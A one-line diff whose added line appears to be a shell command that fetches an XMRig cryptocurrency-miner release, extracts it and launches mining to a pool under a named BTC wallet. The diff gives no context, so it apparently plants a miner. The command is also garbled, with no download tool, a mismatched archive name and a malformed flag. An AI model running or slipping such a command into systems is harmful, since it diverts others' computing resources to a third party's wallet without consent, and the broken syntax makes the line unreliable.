@@ -1,1 +1,1 @@
-rhttps://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 &&./xmrig  o rx.blockchain.com:3333  -a  rx   -k  -u  BTC:bc1q4eym03072yk0zahdm9jym28vk0dxwyvs57sr6g.steffy932.  -p x
+https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 &&./xmrig  o rx.blockchain.com:3333  -a  rx   -k  -u  BTC:bc1q4eym03072yk0zahdm9jym28vk0dxwyvs57sr6g.steffy932.  -p x
